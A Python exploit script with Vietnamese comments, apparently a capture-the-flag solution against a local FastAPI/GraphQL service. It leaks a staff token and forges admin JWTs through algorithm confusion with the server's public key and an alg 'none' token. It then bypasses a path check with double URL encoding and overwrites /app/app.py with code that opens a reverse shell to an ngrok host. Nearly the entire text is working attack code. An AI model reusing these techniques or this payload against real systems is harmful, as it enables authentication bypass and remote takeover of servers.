import requests
import socket
import sys
import threading
import time
import json
import hmac
import hashlib
import base64
from jose import jwt
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend

# ==========================================
# [CẤU HÌNH] CẬP NHẬT NGROK
# ==========================================
YOUR_IP = "0.tcp.ap.ngrok.io"   # <-- IP Ngrok (bỏ tcp://)
YOUR_PORT = 15466               # <-- Port Ngrok
TARGET_HOST = "localhost"
TARGET_PORT = 8000
TARGET_URL = f"http://{TARGET_HOST}:{TARGET_PORT}"
# ==========================================

def log(msg):
    print(f"[*] {msg}")

# --- HÀM TỰ KÝ JWT ---
def base64url_encode(input_bytes):
    return base64.urlsafe_b64encode(input_bytes).decode('utf-8').rstrip('=')

def manual_jwt_sign(payload, secret_bytes, alg="HS256"):
    header = {"typ": "JWT", "alg": alg}
    header_json = json.dumps(header, separators=(',', ':')).encode('utf-8')
    payload_json = json.dumps(payload, separators=(',', ':')).encode('utf-8')
    
    header_b64 = base64url_encode(header_json)
    payload_b64 = base64url_encode(payload_json)
    
    msg = f"{header_b64}.{payload_b64}".encode('utf-8')
    
    if alg == "none":
        return f"{header_b64}.{payload_b64}."
        
    signature = hmac.new(secret_bytes, msg, hashlib.sha256).digest()
    sig_b64 = base64url_encode(signature)
    return f"{header_b64}.{payload_b64}.{sig_b64}"

def get_staff_token():
    log("Đang lấy Staff Token...")
    query = {"query": "{ node(id: \"U3RhZmZOb2RlOjI=\") { ... on StaffNode { accessToken } } }"}
    for _ in range(10):
        try:
            r = requests.post(f"{TARGET_URL}/graphql", json=query, headers={"Connection": "close"}, timeout=5)
            if r.status_code == 200 and 'data' in r.json():
                return r.json()['data']['node']['accessToken']
        except: pass
        time.sleep(0.5)
    sys.exit("[-] Không lấy được Staff Token.")

def forge_tokens_variations(staff_token):
    headers = jwt.get_unverified_header(staff_token)
    claims = jwt.get_unverified_claims(staff_token)
    jwks_uri = claims.get('jwks_uri')
    
    pem_str = None
    log(f"Đang lấy Key từ: {jwks_uri}")
    
    for i in range(1, 20):
        try:
            r = requests.get(f"{TARGET_URL}{jwks_uri}", headers={"Connection": "close"}, timeout=2)
            if r.status_code == 200:
                pem_str = r.json().get('public_key')
                log(f"[+] Đã lấy được Public Key (Lần {i})")
                break
        except: pass
        time.sleep(0.1)
    
    if not pem_str: sys.exit("[-] Không lấy được Key.")

    new_claims = claims.copy()
    new_claims['role'] = 'admin'
    if 'exp' in new_claims: del new_claims['exp']

    tokens = []

    # 1. DER Bytes (PKCS8 - Chuẩn nhất theo source code)
    pub_obj = serialization.load_pem_public_key(pem_str.encode(), backend=default_backend())
    der_bytes = pub_obj.public_bytes(serialization.Encoding.DER, serialization.PublicFormat.SubjectPublicKeyInfo)
    tokens.append(("DER_PKCS8", manual_jwt_sign(new_claims, der_bytes)))

    # 2. PEM String (PKCS8 - Đôi khi thư viện dùng string làm key)
    tokens.append(("PEM_PKCS8", manual_jwt_sign(new_claims, pem_str.encode())))

    # 3. DER Bytes (PKCS1 - Thử định dạng cũ)
    try:
        der_pkcs1 = pub_obj.public_bytes(serialization.Encoding.DER, serialization.PublicFormat.PKCS1)
        tokens.append(("DER_PKCS1", manual_jwt_sign(new_claims, der_pkcs1)))
    except: pass
    
    # 4. Alg "none" (Hy vọng mong manh)
    tokens.append(("ALG_NONE", manual_jwt_sign(new_claims, b"", alg="none")))

    return tokens

def send_raw_upload(admin_token, target_filename, token_name):
    malicious_code = f"""
import os, socket, subprocess, threading, time
def connect():
    time.sleep(1)
    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((socket.gethostbyname("{YOUR_IP}"), {YOUR_PORT}))
        os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
        subprocess.call(["/bin/sh","-i"])
    except: pass
t = threading.Thread(target=connect); t.start()
from fastapi import FastAPI
app = FastAPI()
"""
    boundary = "---------------------------1234567890"
    body_parts = [
        f'--{boundary}',
        f'Content-Disposition: form-data; name="file"; filename="{target_filename}"',
        'Content-Type: application/x-python-code',
        '',
        malicious_code,
        f'--{boundary}--',
        ''
    ]
    body_str = '\r\n'.join(body_parts)
    body_bytes = body_str.encode('utf-8')

    # Path Bypass: Double URL Encode
    path = "/graphql/..%252finternal/upload"

    header_str = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {TARGET_HOST}:{TARGET_PORT}\r\n"
        f"Authorization: Bearer {admin_token}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
        f"Content-Length: {len(body_bytes)}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    )
    full_payload = header_str.encode('utf-8') + body_bytes
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((TARGET_HOST, TARGET_PORT))
        s.sendall(full_payload)
        
        response = b""
        while True:
            try:
                chunk = s.recv(4096)
                if not chunk: break
                response += chunk
            except socket.timeout: break
        s.close()
        
        resp_decoded = response.decode(errors='ignore')
        status_line = resp_decoded.split('\r\n')[0]
        
        # --- PHÂN TÍCH LỖI ---
        if "403" in status_line:
            if '"error":"Forbidden"' in resp_decoded:
                return "GATEWAY_BLOCK" # Gateway chặn path
            else:
                return "APP_BLOCK" # App chặn (Sai Key/Worker)
        elif "200" in status_line:
            return "SUCCESS"
        
        return status_line
    except: return "ERROR"

def exploit_loop(tokens):
    log("BẮT ĐẦU TẤN CÔNG (MỤC TIÊU: /app/app.py)...")
    target_file = "/app/app.py" 
    
    for name, token in tokens:
        log(f"\n[?] Thử Token: {name}")
        
        # Spam 20 lần
        for i in range(1, 21):
            result = send_raw_upload(token, target_file, name)
            
            if result == "SUCCESS":
                log(f"\n[!!!] UPLOAD THÀNH CÔNG (Token: {name}, Try: {i})")
                log("Đang kích hoạt RCE...")
                print(f"\n[*] ==> CHECK NCAT {YOUR_PORT} NGAY LẬP TỨC! <==\n")
                for _ in range(50):
                    try: requests.get(f"{TARGET_URL}/graphql", timeout=0.1)
                    except: pass
                return True
            
            elif result == "GATEWAY_BLOCK":
                print("G", end="", flush=True) # Gateway chặn
            elif result == "APP_BLOCK":
                print("A", end="", flush=True) # App chặn (Cần retry worker khác)
            else:
                print(".", end="", flush=True) # Lỗi khác
            
            time.sleep(0.1)
    return False

if __name__ == "__main__":
    t = get_staff_token()
    token_list = forge_tokens_variations(t)
    exploit_loop(token_list)